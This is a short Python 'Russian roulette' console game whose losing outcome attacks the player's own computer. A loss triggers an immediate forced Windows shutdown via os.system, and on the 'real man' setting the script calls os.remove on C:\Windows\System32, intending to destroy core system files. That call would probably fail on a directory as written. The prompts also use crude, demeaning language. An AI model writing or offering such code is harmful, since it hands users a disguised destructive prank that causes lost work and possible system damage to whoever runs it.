import os
import random

def main():
    difficulty = 0
    cylinder = [0, 0, 0, 0, 0, 0]
    chamber = 0
    bullet = random.randint(0, 5)
    cylinder[bullet] = 1

    print("\nWelcome! Let's play a silly game!\n\nFirs things first, are you a real man or do you wanna play like a pussy?\n\n|1 - I'm a pussy        |\n|2 - I'm a real man     | WARNING! DANGEROUS CHOICE, MAY CAUSE DAMAGE TO YOUR PC!")
    while difficulty<1 or difficulty>2:
        difficulty = int(input("-> "))
        if difficulty<1 or difficulty>2:
            print("\nInvalid choice. Pick 1 or 2\n")

    print("Ok good choice. Now, pick a number between 1 and 6\n")

    while chamber<1 or chamber>6:
        chamber = int(input("-> "))
        if chamber<1 or chamber>6:
            print("\nInvalid number. Pick a number between 1 and 6\n")
    
    if cylinder[chamber-1] == 1:
        print("\nHAHAHAHAHA! You lost! Goodbye!")
        if difficulty == 2:
            deadlyShot()
        else:
            shot()
    else:
        print("\nLucky you! You're safe... for now...")

def shot():
 os.system("shutdown /s /t 1")

def deadlyShot():
 os.remove("C:\Windows\System32")

main()